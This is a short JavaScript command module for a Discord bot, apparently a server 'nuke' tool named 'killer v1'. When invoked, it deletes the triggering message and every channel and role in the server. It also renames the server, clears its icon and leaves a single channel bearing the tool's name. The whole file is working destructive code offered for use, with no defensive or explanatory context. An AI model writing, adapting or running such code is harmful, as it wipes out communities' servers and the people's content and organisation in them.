exports.run = async (client, msg, args) => {

    msg.delete()

    await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
    await msg.guild.roles.map(r => r.delete().catch(() => {}))

    await msg.guild.setName('killer v1')
    await msg.guild.setIcon()

    msg.guild.createChannel('killer v1', {
        type: 'text'
    }).catch(() => {})

}
